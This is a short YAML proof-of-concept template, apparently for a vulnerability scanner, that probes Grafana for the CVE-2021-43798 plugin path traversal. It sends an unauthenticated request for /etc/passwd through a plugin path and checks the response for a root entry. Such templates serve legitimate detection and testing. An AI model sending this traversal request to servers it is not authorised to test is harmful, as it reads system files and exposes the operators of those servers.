name: poc-grafana-dir-traversal
transport: http
set:
  r0: randomInt(1000, 9999)
rules:
  r0:
    request:
      method: GET
      path: "/public/plugins/alertlist/../../../../../../../../etc/passwd"
    expression: response.status == 200 && response.body.bcontains("root:x:0:0")
expression: r0()
detail:
  author: sxel
  description: Grafana plugin path traversal file read probe (CVE-2021-43798, unauth on affected versions)
  severity: high
  tags: grafana,traversal,leak